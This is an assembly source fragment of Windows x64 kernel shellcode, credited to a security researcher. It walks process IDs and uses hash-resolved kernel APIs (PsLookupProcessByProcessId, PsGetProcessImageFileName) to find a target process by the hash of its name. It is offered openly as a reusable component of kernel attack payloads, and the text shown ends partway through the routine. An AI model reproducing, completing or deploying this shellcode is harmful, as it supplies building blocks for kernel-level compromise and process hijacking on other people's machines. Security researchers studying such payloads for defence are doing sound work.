;
; Windows x64 Kernel Find Process by Name Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;
; Arguments: r10d = process hash, r15 = nt!, rdx = *PEPROCESS
; Clobbers: RAX, RCX, RDX, R8, R9, R10, R11
;

[BITS 64]
[ORG 0]

find_process_name:
  xor ecx, ecx

_find_process_name_loop_pid:
  add cx, 0x4
  cmp ecx, 0x10000
  jge kernel_exit

  push rdx
                                                ; rcx = PID
                                                ; rdx = *PEPROCESS
  mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
  call block_api_direct
  add rsp, 0x20

  test rax, rax                                 ; see if STATUS_SUCCESS
  jnz _find_process_name_loop_pid


  pop rdx
  mov rcx, dword [rdx]                          ; *rcx = *PEPROCESS

  push rcx
  mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
  call block_api_direct
  add rsp, 0x20
  pop rcx

  mov rsi, rax
  call calc_hash

  cmp r9d, r10d
  jne _find_process_name_loop_pid
